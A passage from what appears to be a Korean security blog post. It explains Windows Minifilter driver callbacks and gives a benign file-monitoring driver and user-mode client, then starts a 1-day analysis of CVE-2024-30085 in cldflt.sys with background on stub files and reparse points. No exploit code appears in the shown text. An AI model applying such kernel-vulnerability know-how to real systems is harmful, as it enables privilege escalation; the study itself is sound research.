&#xD638;&#xCD9C;</li></ul><blockquote><p>&#xB2E4;&#xC2DC; &#xB3CC;&#xC544;&#xC640; &#xC704; &#xC804;&#xCCB4;&#xC801;&#xC778; &#xD750;&#xB984;&#xC744; &#xD655;&#xC778;&#xD574;&#xBCF4;&#xBA74;&#x2026; Minifilter &#xB4DC;&#xB77C;&#xC774;&#xBC84;&#xB294; &#xAE30;&#xC874;&#xC758; &#xBC29;&#xC2DD;&#xCC98;&#xB7FC; IRP&#xB97C; &#xC9C1;&#xC811; &#xCC98;&#xB9AC;&#xD558;&#xC9C0; &#xC54A;&#xC2B5;&#xB2C8;&#xB2E4;. &#xB300;&#xC2E0;, FilterManager&#xAC00; I/O &#xC694;&#xCCAD;&#xC744; &#xB300;&#xC2E0; &#xBC1B;&#xC544;&#xC11C; Minifilter&#xC5D0;&#xAC8C; &#xCF5C;&#xBC31; &#xD568;&#xC218;&#xB85C; &#xC804;&#xB2EC;&#xD569;&#xB2C8;&#xB2E4;.</p><p>&#xB2E4;&#xC2DC;&#xB9D0;&#xD574; Minifilter &#xB4DC;&#xB77C;&#xC774;&#xBC84;&#xB294; &#xC6B0;&#xB9AC;&#xAC00; &#xD754;&#xD788; &#xC54C;&#xACE0;&#xC788;&#xB294; <strong>DispatchRoutine&#xC744; &#xC124;&#xC815;&#xD560; &#xD544;&#xC694;&#xAC00; &#xC5C6;&#xB294; &#xAC83;&#xC774;&#xC8E0;!</strong></p></blockquote><h2 id="1-2-Minifilter-Callback-Routine"><a href="#1-2-Minifilter-Callback-Routine" class="headerlink" title="1.2 Minifilter Callback Routine"></a>1.2 Minifilter Callback Routine</h2><p>Minifilter &#xB4DC;&#xB77C;&#xC774;&#xBC84;&#xB294; &#xC5B4;&#xB5BB;&#xAC8C; &#xD2B9;&#xC815; &#xD30C;&#xC77C; &#xC791;&#xC5C5;&#xC5D0; &#xB300;&#xD574;&#xC11C;&#xB9CC; &#xB3D9;&#xC791;&#xD560; &#xC218; &#xC788;&#xC744;&#xAE4C;&#xC694;? &#xC774;&#xB294; &#xCF5C;&#xBC31;(Callback)&#xC774;&#xB77C;&#xB294; &#xBA54;&#xCEE4;&#xB2C8;&#xC998; &#xB355;&#xBD84;&#xC785;&#xB2C8;&#xB2E4;.</p><p>Minifilter &#xB4DC;&#xB77C;&#xC774;&#xBC84;&#xB294; <strong>DispatchRoutine</strong>&#xC744; &#xD1B5;&#xD574; IRP&#xB97C; &#xC9C1;&#xC811; &#xCC98;&#xB9AC;&#xD558;&#xC9C0; &#xC54A;&#xB294;&#xB2E4;&#xACE0; &#xD588;&#xC8E0;? &#xADF8; &#xB300;&#xC2E0;, Filter Manager&#xB97C; &#xD1B5;&#xD574; &#xC804;&#xB2EC;&#xB418;&#xB294; I/O &#xC694;&#xCCAD;&#xC5D0; &#x201C;&#xD6C5;(hook)&#x201D;&#xC744; &#xAC78; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. Minifilter&#xB294; &#xC774; &#xC694;&#xCCAD;&#xB4E4;&#xC774; &#xBC1C;&#xC0DD;&#xD560; &#xB54C; <strong>&#xC0AC;&#xC804; &#xCF5C;&#xBC31;(<code>PreOperation Callback</code>)</strong>&#xACFC; <strong>&#xC0AC;&#xD6C4; &#xCF5C;&#xBC31;(<code>PostOperation Callback</code>)</strong>&#xC744; &#xB4F1;&#xB85D;&#xD558;&#xC5EC;, &#xAC10;&#xC2DC;&#xD558;&#xACE0;&#xC790; &#xD558;&#xB294; I/O &#xC791;&#xC5C5;&#xC744; &#xC2DC;&#xC2A4;&#xD15C; &#xC218;&#xC900;&#xC5D0;&#xC11C; &#xAD00;&#xCC30;&#xD558;&#xAC70;&#xB098; &#xC81C;&#xC5B4;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><ul><li><strong>&#xC0AC;&#xC804; &#xC791;&#xC5C5; &#xCF5C;&#xBC31; (<code>PFLT_PRE_OPERATION_CALLBACK</code>)</strong></li></ul><pre><code class="hljs c">PFLT_PRE_OPERATION_CALLBACK PfltPreOperationCallback;<span class="hljs-function">FLT_PREOP_CALLBACK_STATUS <span class="hljs-title">PfltPreOperationCallback</span><span class="hljs-params">(</span></span><span class="hljs-function"><span class="hljs-params">  [in, out] PFLT_CALLBACK_DATA Data,</span></span><span class="hljs-function"><span class="hljs-params">  [in]      PCFLT_RELATED_OBJECTS FltObjects,</span></span><span class="hljs-function"><span class="hljs-params">  [out]     PVOID *CompletionContext</span></span><span class="hljs-function"><span class="hljs-params">)</span></span><span class="hljs-function"></span>{...}</code></pre><p>I/O &#xC694;&#xCCAD;&#xC774; &#xD30C;&#xC77C; &#xC2DC;&#xC2A4;&#xD15C;&#xC774;&#xB098; &#xD558;&#xC704; &#xB4DC;&#xB77C;&#xC774;&#xBC84;&#xB85C; &#xC804;&#xB2EC;&#xB418;&#xAE30; &#xC774;&#xC804;&#xC5D0; &#xD638;&#xCD9C;&#xB429;&#xB2C8;&#xB2E4;. Minifilter&#xC758; &#xD575;&#xC2EC; &#xB85C;&#xC9C1;&#xC774; &#xC218;&#xD589;&#xB418;&#xB294; &#xACF3;&#xC73C;&#xB85C; <code>FLT_PREOP_COMPLETE</code>, <code>FLT_PREOP_SUCCESS_WITH_CALLBACK</code>, <code>FLT_PREOP_SUCCESS_NO_CALLBACK</code>&#xACFC; &#xAC19;&#xC740; &#xAC15;&#xB825;&#xD55C; &#xAD8C;&#xD55C;&#xC744; &#xAC00;&#xC9C0;&#xACE0; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.<br><a href="https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/fltkernel/nc-fltkernel-pflt_pre_operation_callback"><strong>PFLT_PRE_OPERATION_CALLBACK callback function (fltkernel.h)</strong></a></p><ul><li><strong>&#xC0AC;&#xD6C4; &#xC791;&#xC5C5; &#xCF5C;&#xBC31; (<code>PFLT_POST_OPERATION_CALLBACK</code>)</strong></li></ul><pre><code class="hljs c">PFLT_POST_OPERATION_CALLBACK PfltPostOperationCallback;<span class="hljs-function">FLT_POSTOP_CALLBACK_STATUS <span class="hljs-title">PfltPostOperationCallback</span><span class="hljs-params">(</span></span><span class="hljs-function"><span class="hljs-params">  [in, out]      PFLT_CALLBACK_DATA Data,</span></span><span class="hljs-function"><span class="hljs-params">  [in]           PCFLT_RELATED_OBJECTS FltObjects,</span></span><span class="hljs-function"><span class="hljs-params">  [in, optional] PVOID CompletionContext,</span></span><span class="hljs-function"><span class="hljs-params">  [in]           FLT_POST_OPERATION_FLAGS Flags</span></span><span class="hljs-function"><span class="hljs-params">)</span></span><span class="hljs-function"></span>{...}</code></pre><p>I/O &#xC694;&#xCCAD;&#xC774; &#xD558;&#xC704; &#xB4DC;&#xB77C;&#xC774;&#xBC84;&#xC640; &#xD30C;&#xC77C; &#xC2DC;&#xC2A4;&#xD15C;&#xC5D0;&#xC11C; &#xCC98;&#xB9AC;&#xB97C; &#xBAA8;&#xB450; &#xB9C8;&#xCE58;&#xACE0; &#xB3CC;&#xC544;&#xC624;&#xB294; &#xAE38;&#xC5D0; &#xD638;&#xCD9C;&#xB429;&#xB2C8;&#xB2E4;. &#xC791;&#xC5C5;&#xC758; &#xC131;&#xACF5; &#xC5EC;&#xBD80;&#xB97C; &#xD655;&#xC778;&#xD558;&#xAC70;&#xB098;, &#xACB0;&#xACFC;&#xB97C; &#xB85C;&#xAE45;&#xD558;&#xAC70;&#xB098;, &#xD544;&#xC694;&#xD558;&#xB2E4;&#xBA74; &#xC791;&#xC5C5; &#xACB0;&#xACFC;&#xB97C; &#xC218;&#xC815;&#xD558;&#xB294; &#xB4F1;&#xC758; &#xD6C4;&#xCC98;&#xB9AC; &#xC791;&#xC5C5;&#xC744; &#xC218;&#xD589;&#xD569;&#xB2C8;&#xB2E4;.<br><a href="https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/fltkernel/nc-fltkernel-pflt_post_operation_callback"><strong>PFLT_POST_OPERATION_CALLBACK callback function (fltkernel.h)</strong></a></p><blockquote><p>&#xACB0;&#xACFC;&#xC801;&#xC73C;&#xB85C;, &#xC774; &#xCF5C;&#xBC31;&#xB4E4;&#xC740; <code>FLT_OPERATION_REGISTRATION</code>&#xC774;&#xB77C;&#xB294; &#xAD6C;&#xC870;&#xCCB4;&#xC5D0; &#x201C;&#xC5B4;&#xB5A4; I/O &#xC791;&#xC5C5;(MajorFunction)&#xC5D0; &#xC5B4;&#xB5A4; &#xC0AC;&#xC804;/&#xC0AC;&#xD6C4; &#xCF5C;&#xBC31; &#xD568;&#xC218;&#xB97C; &#xC5F0;&#xACB0;&#xD560;&#xC9C0;&#x201D;&#xB97C; &#xBA85;&#xC2DC;&#xD574; &#xB4F1;&#xB85D;&#xD569;&#xB2C8;&#xB2E4;.</p></blockquote><h2 id="1-3-Minifilter&#xC640;-User-Mode-&#xAC04;&#xC758;-&#xD1B5;&#xC2E0;"><a href="#1-3-Minifilter&#xC640;-User-Mode-&#xAC04;&#xC758;-&#xD1B5;&#xC2E0;" class="headerlink" title="1.3 Minifilter&#xC640; User-Mode &#xAC04;&#xC758; &#xD1B5;&#xC2E0;"></a>1.3 Minifilter&#xC640; User-Mode &#xAC04;&#xC758; &#xD1B5;&#xC2E0;</h2><p>Minifilter &#xB4DC;&#xB77C;&#xC774;&#xBC84;&#xC640; User-Mode &#xC560;&#xD50C;&#xB9AC;&#xCF00;&#xC774;&#xC158; &#xAC04;&#xC758; &#xD1B5;&#xC2E0;&#xC740; <strong>&#xD544;&#xD130; &#xD1B5;&#xC2E0; &#xD3EC;&#xD2B8;</strong>&#xB97C; &#xD1B5;&#xD574; &#xC774;&#xB8E8;&#xC5B4;&#xC9D1;&#xB2C8;&#xB2E4;. &#xD1B5;&#xC2E0; &#xD3EC;&#xD2B8;&#xB780;, Minifilter&#xC640; &#xC571; &#xC0AC;&#xC774;&#xC758; &#xC804;&#xC6A9; &#xACE0;&#xC18D; &#xD1B5;&#xC2E0; &#xCC44;&#xB110;&#xC785;&#xB2C8;&#xB2E4;. &#xC774; &#xD3EC;&#xD2B8;&#xB294; Kernel Mode &#xB4DC;&#xB77C;&#xC774;&#xBC84;&#xC640; User-Mode &#xD504;&#xB85C;&#xC138;&#xC2A4; &#xAC04;&#xC758; &#xC548;&#xC804;&#xD55C; &#xBA54;&#xC2DC;&#xC9C0; &#xC804;&#xB2EC;&#xC744; &#xAC00;&#xB2A5;&#xD558;&#xAC8C; &#xD569;&#xB2C8;&#xB2E4;. &#xCF54;&#xB4DC;&#xB97C; &#xC9C1;&#xC811; &#xD655;&#xC778;&#xD574;&#xBCF4;&#xBA70; Microsoft&#xAC00; &#xC81C;&#xACF5;&#xD558;&#xB294; &#xC5EC;&#xB7EC; API&#xB97C; &#xD655;&#xC778;&#xD574;&#xBD05;&#xC2DC;&#xB2E4;!</p><h3 id="Driver-Code"><a href="#Driver-Code" class="headerlink" title="Driver Code"></a>Driver Code</h3><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;fltKernel.h&gt;</span></span>PFLT_FILTER gFilter = <span class="hljs-literal">NULL</span>;PFLT_PORT gServerPort = <span class="hljs-literal">NULL</span>, gClientPort = <span class="hljs-literal">NULL</span>;<span class="hljs-function">VOID <span class="hljs-title">OnDisconnect</span><span class="hljs-params">(PVOID Cookie)</span> </span>{    UNREFERENCED_PARAMETER(Cookie);    FltCloseClientPort(gFilter, &amp;gClientPort);    gClientPort = <span class="hljs-literal">NULL</span>;}<span class="hljs-function">NTSTATUS <span class="hljs-title">OnConnect</span><span class="hljs-params">(PFLT_PORT ClientPort, PVOID SrvCookie, PVOID Ctx, ULONG Size, PVOID* ConnCookie)</span> </span>{    UNREFERENCED_PARAMETER(SrvCookie);    UNREFERENCED_PARAMETER(Ctx);    UNREFERENCED_PARAMETER(Size);    UNREFERENCED_PARAMETER(ConnCookie);    gClientPort = ClientPort;    <span class="hljs-keyword">return</span> STATUS_SUCCESS;}<span class="hljs-function">FLT_PREOP_CALLBACK_STATUS <span class="hljs-title">PreCreate</span><span class="hljs-params">(PFLT_CALLBACK_DATA Data, PCFLT_RELATED_OBJECTS FltObjects, PVOID* Buff)</span> </span>{    UNREFERENCED_PARAMETER(FltObjects);    UNREFERENCED_PARAMETER(Buff);    PFLT_FILE_NAME_INFORMATION nameInfo;    <span class="hljs-keyword">if</span> (gClientPort &amp;&amp; NT_SUCCESS(FltGetFileNameInformation(Data, FLT_FILE_NAME_NORMALIZED, &amp;nameInfo))) {        FltSendMessage(gFilter, &amp;gClientPort, nameInfo-&gt;Name.Buffer, nameInfo-&gt;Name.Length, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>);        FltReleaseFileNameInformation(nameInfo);    }    <span class="hljs-keyword">return</span> FLT_PREOP_SUCCESS_NO_CALLBACK;}<span class="hljs-function">NTSTATUS <span class="hljs-title">Unload</span><span class="hljs-params">(FLT_FILTER_UNLOAD_FLAGS Flags)</span> </span>{    UNREFERENCED_PARAMETER(Flags);    FltCloseCommunicationPort(gServerPort);    FltUnregisterFilter(gFilter);    <span class="hljs-keyword">return</span> STATUS_SUCCESS;}<span class="hljs-function">NTSTATUS <span class="hljs-title">DriverEntry</span><span class="hljs-params">(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath)</span> </span>{    UNREFERENCED_PARAMETER(RegistryPath);    NTSTATUS status;    <span class="hljs-keyword">const</span> FLT_OPERATION_REGISTRATION Cbs[] = { { IRP_MJ_CREATE, <span class="hljs-number">0</span>, PreCreate, <span class="hljs-literal">NULL</span> }, { IRP_MJ_OPERATION_END } };    <span class="hljs-keyword">const</span> FLT_REGISTRATION Reg = { <span class="hljs-keyword">sizeof</span>(FLT_REGISTRATION), FLT_REGISTRATION_VERSION, <span class="hljs-number">0</span>, <span class="hljs-literal">NULL</span>, Cbs, Unload };    status = FltRegisterFilter(DriverObject, &amp;Reg, &amp;gFilter);    <span class="hljs-keyword">if</span> (!NT_SUCCESS(status)) <span class="hljs-keyword">return</span> status;    UNICODE_STRING portName = RTL_CONSTANT_STRING(<span class="hljs-string">L&quot;\\FileActivityMonitorPort&quot;</span>);    OBJECT_ATTRIBUTES oa = { <span class="hljs-keyword">sizeof</span>(oa), <span class="hljs-literal">NULL</span>, &amp;portName, OBJ_KERNEL_HANDLE | OBJ_CASE_INSENSITIVE, <span class="hljs-literal">NULL</span> };    status = FltCreateCommunicationPort(gFilter, &amp;gServerPort, &amp;oa, <span class="hljs-literal">NULL</span>, OnConnect, OnDisconnect, <span class="hljs-literal">NULL</span>, <span class="hljs-number">1</span>);    <span class="hljs-keyword">if</span> (!NT_SUCCESS(status)) {        FltUnregisterFilter(gFilter);        <span class="hljs-keyword">return</span> status;    }    <span class="hljs-keyword">return</span> FltStartFiltering(gFilter);}</code></pre><p>&#xB300;&#xD45C;&#xC801;&#xC778; Driver Code API&#xC778; <code>FltCreateCommunicationPort()</code>, <code>FltSendMessage()</code>, <code>FltCloseCommunicationPort()</code>&#xC5D0; &#xCD08;&#xC810;&#xC744; &#xB9DE;&#xCDB0;&#xC11C; Minifilter &#xB4DC;&#xB77C;&#xC774;&#xBC84; &#xCF54;&#xB4DC;&#xB97C; &#xC608;&#xC81C;&#xB85C; &#xAD6C;&#xD604;&#xD574;&#xBCF4;&#xC558;&#xB294;&#xB370;&#xC694;. &#xD750;&#xB984;&#xC744; &#xD568;&#xAED8; &#xC0B4;&#xD3B4;&#xBCFC;&#xAE4C;&#xC694;?</p><ol><li>&#xB4DC;&#xB77C;&#xC774;&#xBC84;&#xB294; <code>FltRegisterFilter()</code>&#xB97C; &#xD1B5;&#xD574; &#xC790;&#xC2E0;&#xC744; &#xB4F1;&#xB85D;&#xD569;&#xB2C8;&#xB2E4;. &#xC774;&#xB54C; &#xD30C;&#xC77C; &#xC0DD;&#xC131;&#xACFC; &#xC5F4;&#xAE30;(<code>IRP_MJ_CREATE</code>) &#xC694;&#xCCAD;&#xC744; &#xAC10;&#xC2DC;&#xD560; PreCreateCallback &#xD568;&#xC218;&#xB97C; &#xC9C0;&#xC815;&#xD558;&#xACE0;, <code>FltStartFiltering()</code>&#xC73C;&#xB85C; I/O &#xAC10;&#xC2DC;&#xB97C; &#xC2DC;&#xC791;&#xD569;&#xB2C8;&#xB2E4;.</li><li><code>FltCreateCommunicationPort()</code> &#xD568;&#xC218;&#xB97C; &#xD1B5;&#xD574; &#xD1B5;&#xC2E0; &#xD3EC;&#xD2B8;&#xB97C; &#xC0DD;&#xC131;&#xD560; &#xC218; &#xC788;&#xB294;&#xB370;&#xC694;, &#xC704;&#xC758; &#xCF54;&#xB4DC;&#xC5D0;&#xC11C;&#xB294; User-Mode &#xC560;&#xD50C;&#xB9AC;&#xCF00;&#xC774;&#xC158;&#xC774; &#xC5F0;&#xACB0;&#xD558;&#xACE0; &#xC54C;&#xB9BC;&#xC744; &#xBC1B;&#xC744; &#xC218; &#xC788;&#xB294; &#xD1B5;&#xC2E0; &#xD3EC;&#xD2B8; <code>\\FileActivityMonitorPort</code>&#xB97C; &#xC0DD;&#xC131;&#xD558;&#xACE0; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</li><li>&#xB9CC;&#xC57D; &#xD30C;&#xC77C; &#xC0DD;&#xC131;/&#xC5F4;&#xAE30; &#xC774;&#xBCA4;&#xD2B8;&#xAC00; &#xBC1C;&#xC0DD;&#xD558;&#xBA74; PreCreateCallback&#xC774; &#xD638;&#xCD9C;&#xB418;&#xACE0;, &#xD574;&#xB2F9; &#xD568;&#xC218;&#xB294; &#xC5B4;&#xB5A4; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xAC00; &#xC5B4;&#xB5A4; &#xD30C;&#xC77C;&#xC5D0; &#xC811;&#xADFC;&#xD588;&#xB294;&#xC9C0; &#xC815;&#xBCF4;&#xB97C; &#xC218;&#xC9D1;&#xD569;&#xB2C8;&#xB2E4;.</li><li>&#xC774;&#xD6C4; <code>FltSendMessage()</code> &#xD568;&#xC218;&#xB97C; &#xC0AC;&#xC6A9;&#xD574; PreCreateCall&#xC5D0;&#xC11C; &#xC218;&#xC9D1;&#xD55C; &#xC2E4;&#xC2DC;&#xAC04; &#xD30C;&#xC77C; &#xC811;&#xADFC; &#xC815;&#xBCF4;&#xB97C; &#xC5F0;&#xACB0;&#xB418;&#xC5B4;&#xC788;&#xB294; User-Mode &#xC560;&#xD50C;&#xB9AC;&#xCF00;&#xC774;&#xC158;&#xC73C;&#xB85C; &#xC989;&#xC2DC; &#xC804;&#xC1A1;&#xD569;&#xB2C8;&#xB2E4;.</li><li>&#xB9C8;&#xC9C0;&#xB9C9;&#xC73C;&#xB85C; FilterUnload &#xC5B8;&#xB85C;&#xB4DC; &#xD568;&#xC218;&#xB97C; &#xD1B5;&#xD574; &#xB4DC;&#xB77C;&#xC774;&#xBC84;&#xAC00; &#xC885;&#xB8CC;&#xB420; &#xB54C;, &#xC5F4;&#xC5C8;&#xB358; &#xD1B5;&#xC2E0; &#xD3EC;&#xD2B8;&#xB97C; <code>FltCloseCommunicationPort()</code>&#xB85C; &#xB2EB;&#xACE0; &#xD544;&#xD130; &#xB4F1;&#xB85D;&#xC744; &#xD574;&#xC81C;&#xD569;&#xB2C8;&#xB2E4;.</li></ol><h3 id="User-Mode-Application-Code"><a href="#User-Mode-Application-Code" class="headerlink" title="User-Mode Application Code"></a>User-Mode Application Code</h3><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;windows.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;fltuser.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(lib, <span class="hljs-meta-string">&quot;fltlib.lib&quot;</span>)</span><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>{    HANDLE port;    HRESULT hr;        BYTE buffer[<span class="hljs-keyword">sizeof</span>(FILTER_MESSAGE_HEADER) + <span class="hljs-number">1024</span>];    PFILTER_MESSAGE_HEADER header = (PFILTER_MESSAGE_HEADER)buffer;    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Connecting to driver...\n&quot;</span>);    hr = FilterConnectCommunicationPort(<span class="hljs-string">L&quot;\\FileActivityMonitorPort&quot;</span>, <span class="hljs-number">0</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>, <span class="hljs-literal">NULL</span>, &amp;port);    <span class="hljs-keyword">if</span> (IS_ERROR(hr)) {        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Connection failed. Error 0x%X\n&quot;</span>, hr);        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;    }    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Connected. Waiting for file events...\n&quot;</span>);    <span class="hljs-keyword">while</span> (TRUE) {        hr = FilterGetMessage(port, header, <span class="hljs-keyword">sizeof</span>(buffer), <span class="hljs-literal">NULL</span>);                <span class="hljs-keyword">if</span> (SUCCEEDED(hr)) {            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;File Accessed: %S\n&quot;</span>, (PWSTR)header-&gt;MessageBody);        } <span class="hljs-keyword">else</span> {            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Connection lost. Error 0x%X\n&quot;</span>, hr);            <span class="hljs-keyword">break</span>;        }    }    CloseHandle(port);    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;}</code></pre><p>&#xC774;&#xC81C; User-Mode &#xC560;&#xD50C;&#xB9AC;&#xCF00;&#xC774;&#xC158;&#xC758; &#xD1B5;&#xC2E0; &#xD750;&#xB984;&#xC744; &#xD655;&#xC778;&#xD574;&#xBD05;&#xC2DC;&#xB2E4;. &#xB300;&#xD45C;&#xC801;&#xC778; API&#xB85C; <code>FilterConnectCommunicationPort()</code>, <code>FilterSendMessage()</code>&#xAC00; &#xC874;&#xC7AC;&#xD569;&#xB2C8;&#xB2E4;.</p><ol><li>&#xBA3C;&#xC800; <code>FilterConnectCommunicationPort()</code> &#xD568;&#xC218;&#xB97C; &#xC0AC;&#xC6A9;&#xD574; &#xCEE4;&#xB110;&#xC5D0; &#xC788;&#xB294; Minifilter &#xB4DC;&#xB77C;&#xC774;&#xBC84;&#xC758; &#xD1B5;&#xC2E0; &#xD3EC;&#xD2B8;&#xC778; <code>\\FileActivityMonitorPort</code>&#xC5D0; &#xC5F0;&#xACB0;&#xD558;&#xACE0; &#xD1B5;&#xC2E0;&#xC744; &#xC704;&#xD55C; HANDLE&#xC744; &#xC5BB;&#xC2B5;&#xB2C8;&#xB2E4;.</li><li>&#xADF8; &#xD6C4; <code>FilterGetMessage()</code> &#xD568;&#xC218;&#xB97C; &#xD638;&#xCD9C;&#xD558;&#xC5EC;, &#xB4DC;&#xB77C;&#xC774;&#xBC84;&#xB85C;&#xBD80;&#xD130; &#xD30C;&#xC77C; &#xACBD;&#xB85C; &#xBB38;&#xC790;&#xC5F4;&#xC744; &#xC9C1;&#xC811; &#xC218;&#xC2E0;&#xD569;&#xB2C8;&#xB2E4;. &#xC131;&#xACF5;&#xC801;&#xC73C;&#xB85C; &#xC218;&#xC2E0;&#xB418;&#xBA74; &#xD574;&#xB2F9; &#xD30C;&#xC77C; &#xACBD;&#xB85C;&#xB97C; &#xD654;&#xBA74;&#xC5D0; &#xCD9C;&#xB825;&#xD569;&#xB2C8;&#xB2E4;.</li></ol><h1 id="2-CVE-2024-30085-1-Day-Analysis"><a href="#2-CVE-2024-30085-1-Day-Analysis" class="headerlink" title="2. [CVE-2024-30085] 1-Day Analysis"></a>2. [CVE-2024-30085] 1-Day Analysis</h1><hr><p>&#xD558;&#xB8E8;&#xD55C;&#xC904;&#xC5D0;&#xB3C4; &#xC18C;&#xAC1C;&#xB418;&#xC5C8;&#xB358; Windows Minifilter Driver &#xCDE8;&#xC57D;&#xC810;&#xC778;&#xB370;&#xC694;(<a href="https://hackyboiz.github.io/2025/01/11/OUYA77/2025-01-11/">reference</a>). CVE-2024-30085&#xB97C; &#xC9C1;&#xC811; &#xC7AC;&#xD604;&#xD574;&#xBCF4;&#xBA70; Minifilter &#xB4DC;&#xB77C;&#xC774;&#xBC84;&#xB97C; &#xD568;&#xAED8; &#xC54C;&#xC544;&#xAC00;&#xBCF4;&#xB3C4;&#xB85D; &#xD569;&#xC2DC;&#xB2E4;.</p><blockquote><p><strong>&#x1FA9F; Environment : Windows 11 22h2/23h2 10.0.2261.3672</strong></p></blockquote><p><img src="/2025/08/15/banda/Minifilter-Driver/ko/image4.png" alt></p><p>Windows Cloud Files Mini Filter &#xB4DC;&#xB77C;&#xC774;&#xBC84;&#xB294; Windows &#xD074;&#xB77C;&#xC6B0;&#xB4DC; &#xB3D9;&#xAE30;&#xD654; &#xAE30;&#xB2A5;&#xC744; &#xC218;&#xD589;&#xD569;&#xB2C8;&#xB2E4;. &#xC608;&#xC2DC;&#xB85C; &#xC9C0;&#xAE08; &#xC800;&#xC758; &#xD3F4;&#xB354;&#xB97C; &#xD558;&#xB098; &#xCC0D;&#xC5B4;&#xC654;&#xB294;&#xB370;&#xC694;, &#xC624;&#xB298;&#xC740; &#xD574;&#xB2F9; Minifilter &#xB4DC;&#xB77C;&#xC774;&#xBC84; &#xCDE8;&#xC57D;&#xC810;&#xC744; &#xC774;&#xD574;&#xD558;&#xAE30; &#xC704;&#xD574; &#xBA3C;&#xC800; Stub File, Reparse Point&#xC5D0; &#xB300;&#xD55C; &#xC0AC;&#xC804; &#xACF5;&#xBD80;&#xAC00; &#xD544;&#xC694;&#xD569;&#xB2C8;&#xB2E4;.</p><h3 id="Stub-File&#xC774;&#xB780;"><a href="#Stub-File&#xC774;&#xB780;" class="headerlink" title="Stub File&#xC774;&#xB780;?"></a>Stub File&#xC774;&#xB780;?</h3><p>Stub File&#xC740; &#xB85C;&#xCEEC;&#xC5D0;&#xB294; &#xC2E4;&#xC81C;&#xB85C; &#xB370;&#xC774;&#xD130;&#xAC00; &#xC5C6;&#xACE0;, placeholder &#xD615;&#xD0DC;&#xB85C; &#xC874;&#xC7AC;&#xD558;&#xB294; &#xD30C;&#xC77C;&#xC744; &#xC758;&#xBBF8;&#xD569;&#xB2C8;&#xB2E4;. &#xC704;&#xC758; &#xC774;&#xBBF8;&#xC9C0;&#xB97C; &#xD655;&#xC778;&#xD574;&#xBCF4;&#xBA74; &#x2018;&#xC0AC;&#xC9C4;&#x2019; &#xD3F4;&#xB354;&#xC5D0; &#xD30C;&#xB780;&#xC0C9; &#xAD6C;&#xB984; &#xC544;&#xC774;&#xCF58;&#xC774; status&#xB85C; &#xB098;&#xD0C0;&#xB098;&#xC788;&#xC8E0;? &#xBC14;&#xB85C; &#xD574;&#xB2F9; &#xD30C;&#xC77C;&#xC774; stub &#xC0C1;&#xD0DC;&#xB77C;&#xACE0; &#xBCFC; &#xC218; &#xC788;&#xC5B4;&#xC694;. NTFS &#xC0C1;&#xC5D0;&#xC11C; &#xD30C;&#xC77C; &#xD06C;&#xAE30;, &#xC774;&#xB984;, &#xC544;&#xC774;&#xCF58; &#xB4F1;&#xC740; &#xD45C;&#xC2DC;&#xD558;&#xC9C0;&#xB9CC;, &#xD30C;&#xC77C; &#xB0B4;&#xC6A9;&#xC740; &#xC804;&#xD600; &#xC800;&#xC7A5;&#xB418;&#xC5B4; &#xC788;&#xC9C0; &#xC54A;&#xC2B5;&#xB2C8;&#xB2E4;.</p><h3 id="Reparse-Point-Metadata"><a href="#Reparse-Point-Metadata" class="headerlink" title="Reparse Point Metadata"></a>Reparse Point Metadata</h3><p>&#xADF8;&#xB7FC; &#xC0AC;&#xC6A9;&#xC790;&#xAC00; &#xC774;&#xB7EC;&#xD55C; &#xD30C;&#xC77C;&#xC5D0; &#xC811;&#xADFC;&#xD558;&#xBA74; &#xC5B4;&#xB5BB;&#xAC8C; &#xB420;&#xAE4C;&#xC694;!? NTFS&#xB294; Reparse Tag&#xB97C; &#xBCF4;&#xACE0; <strong>&#x201C;&#xC624;&#xD638;&#x2026; &#xC774;&#xAC74; stub file&#xC774;&#xB124;!&#x201D;</strong>&#xB77C;&#xACE0; &#xD310;&#xB2E8;&#xD569;&#xB2C8;&#xB2E4;. &#xC774;&#xB54C; Windows Cloud Files Minifilter(<code>cldflt.sys</code>)&#xAC00; &#xC774; <code>Reparse Point</code> &#xBA54;&#xD0C0;&#xB370;&#xC774;&#xD130; &#xAD6C;&#xC870;&#xCCB4;&#xB97C; &#xC77D;&#xACE0;, &#xC774; &#xD30C;&#xC77C;&#xC744; &#xC5B4;&#xB5BB;&#xAC8C; &#xCC98;&#xB9AC;&#xD560;&#xC9C0; &#xACB0;&#xC815;&#xD558;&#xB294; &#xAC83;&#xC774;&#xC8E0;.</p><p>&#xC774;&#xD6C4; Minifilter&#xC740; &#xC6D0;&#xACA9; &#xC11C;&#xBC84;&#xC640; &#xD1B5;&#xC2E0;&#xC744; &#xC900;&#xBE44;&#xD558;&#xB294;&#xB370;, <code>cldflt.sys</code>&#xB294; &#xC9C1;&#xC811; &#xC11C;&#xBC84;&#xC640; &#xD1B5;&#xC2E0;&#xD558;&#xC9C0; &#xC54A;&#xC2B5;&#xB2C8;&#xB2E4;. User-Mode &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xC5D0; &#xC2E4;&#xC81C; &#xC791;&#xC5C5;&#xC744; 